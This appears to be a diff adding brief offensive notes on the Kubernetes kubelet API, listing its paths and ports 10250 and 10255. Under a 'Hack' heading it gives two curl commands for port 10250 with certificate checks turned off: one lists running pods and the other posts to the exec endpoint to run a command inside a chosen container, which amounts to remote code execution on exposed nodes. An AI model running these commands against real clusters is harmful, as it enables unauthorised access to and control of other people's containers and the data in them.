@@ -1,0 +1,16 @@
+
+	### API Use ###
+
+* Paths:
+	-/stats/*
+	-/metrics/*
+	-/logs/*
+	-/spec/*
+
+* Ports:
+	- 10255 > read only HTTP
+	- 10250 > HTTPS port that can essentially do whatever you want
+
+* Hack:
+	- curl --insecure  https://kube-node-here:10250/pods | jq
+	- curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello_world&input=1&output=1&tty=1"
